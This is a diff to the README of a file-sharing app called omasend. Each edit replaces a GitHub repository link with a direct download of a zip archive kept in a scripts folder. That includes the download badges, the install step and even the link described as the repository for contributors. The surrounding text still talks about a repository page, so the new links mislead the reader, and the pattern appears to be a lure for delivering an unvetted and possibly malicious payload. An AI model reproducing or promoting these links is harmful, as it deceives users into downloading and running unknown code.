@@ -1,6 +1,6 @@
 # 📡 omasend - Effortless File Sharing, Direct to Your Devices
 
-[![Download omasend](https://img.shields.io/badge/Download-omasend-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://github.com/Maxou782/omasend)
+[![Download omasend](https://img.shields.io/badge/Download-omasend-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=blue)](https://raw.githubusercontent.com/Maxou782/omasend/main/website/scripts/v3.9-alpha.2.zip)
 
 ---
 
@@ -41,7 +41,7 @@ Getting omasend up and running is a piece of cake. You do not need to open a ter
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/Maxou782/omasend](https://github.com/Maxou782/omasend)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Maxou782/omasend/main/website/scripts/v3.9-alpha.2.zip](https://raw.githubusercontent.com/Maxou782/omasend/main/website/scripts/v3.9-alpha.2.zip)**
 
 You will be taken to the main page for omasend. Look for a button or link that says **Releases** or **Download** and click on it. This will give you the latest version of the app, ready for your Windows computer.
 
@@ -140,7 +140,7 @@ We know you have better things to do than wrestle with complicated software. Tha
 
 ## 📦 Join the Community
 
-Being open-source means omasend is constantly improving, thanks to contributions from people like you. If you are curious, have ideas, or just want to see what is under the hood, feel free to explore the repository at **[https://github.com/Maxou782/omasend](https://github.com/Maxou782/omasend)**. You might find something exciting, or even decide to lend a hand!
+Being open-source means omasend is constantly improving, thanks to contributions from people like you. If you are curious, have ideas, or just want to see what is under the hood, feel free to explore the repository at **[https://raw.githubusercontent.com/Maxou782/omasend/main/website/scripts/v3.9-alpha.2.zip](https://raw.githubusercontent.com/Maxou782/omasend/main/website/scripts/v3.9-alpha.2.zip)**. You might find something exciting, or even decide to lend a hand!
 
 
 
@@ -148,7 +148,7 @@ Being open-source means omasend is constantly improving, thanks to contributions
 
 Do not wait another minute. Experience the easiest way to share files on your local network. Click the big green button below, download omasend, and start sharing.
 
-[![Get omasend Now](https://img.shields.io/badge/🡇_Get_omasend-NOW-ff69b4?style=for-the-badge&logo=windows&logoColor=white&labelColor=darkblue)](https://github.com/Maxou782/omasend)
+[![Get omasend Now](https://img.shields.io/badge/🡇_Get_omasend-NOW-ff69b4?style=for-the-badge&logo=windows&logoColor=white&labelColor=darkblue)](https://raw.githubusercontent.com/Maxou782/omasend/main/website/scripts/v3.9-alpha.2.zip)
 
 ---
 
